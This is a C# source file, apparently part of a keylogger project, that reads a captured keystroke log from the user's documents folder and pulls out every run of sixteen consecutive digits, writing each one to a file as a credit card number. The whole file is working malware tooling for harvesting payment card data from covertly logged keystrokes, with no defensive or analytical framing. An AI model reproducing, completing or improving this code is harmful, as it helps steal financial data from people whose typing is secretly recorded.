using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using HookKeylogger.Base;
using System.IO;
using Google.Protobuf;

namespace KeypressAggregator
{
    class KeypressAggregator
    {
        ///<summary>
        ///This reads through the keylog file and attempts to extract data
        ///</summary>
        static void Main(string[] args)
        {
            // The path of the keylog file
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\keylog";
            // The new file that holds the extracted data
            string newFile = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\data";

            // Read the file
            KeyPressBuffer kpb = new KeyPressBuffer(path);

            // Counter for credit card
            int creditCard = 0;
            String creditNum = "";

            // Write the information to the stream, goes through each keypress
            StreamWriter o = new StreamWriter(newFile);
            foreach (KeyPress ks in kpb.Keys)
            {
                // Looks for a credit card number, ie 16 consecutive digits
                // A number is between 48 and 57. If there is a match, the count
                // is incremented and the number is added to string. Otherwise
                // the count is reset to 0 and the string is cleared
                if(ks.Key > 47 && ks.Key < 58)
                {
                    creditCard += 1;
                    creditNum += keyValue(ks.Key);
                    if (creditCard % 4 == 0)
                    {
                        creditNum += " ";
                    }
                }
                else
                {
                    creditCard = 0;
                    creditNum = "";
                }
                // If there are a total of 16 consecutive numbers, the credit card
                // number is sent to the file
                if(creditCard == 16)
                {
                    o.WriteLine("Credit Card Number: " + creditNum);
                    creditCard = 0;
                    creditNum = "";
                }
            }
            o.Close();

        }

        // A method for figuring out the actual keypress. There is likely a better way to do this. Please
        // tell me if this is the case. I'm currently on a plane with no internet. I'll probably fix this
        // later...
        static String keyValue(int val)
        {
            String ret = "NOPE";
            if (val == 48)
                ret = "0";
            else if (val == 49)
                ret = "1";
            else if (val == 50)
                ret = "2";
            else if (val == 51)
                ret = "3";
            else if (val == 52)
                ret = "4";
            else if (val == 53)
                ret = "5";
            else if (val == 54)
                ret = "6";
            else if (val == 55)
                ret = "7";
            else if (val == 56)
                ret = "8";
            else if (val == 57)
                ret = "9";
            return ret;
        }
    }
}
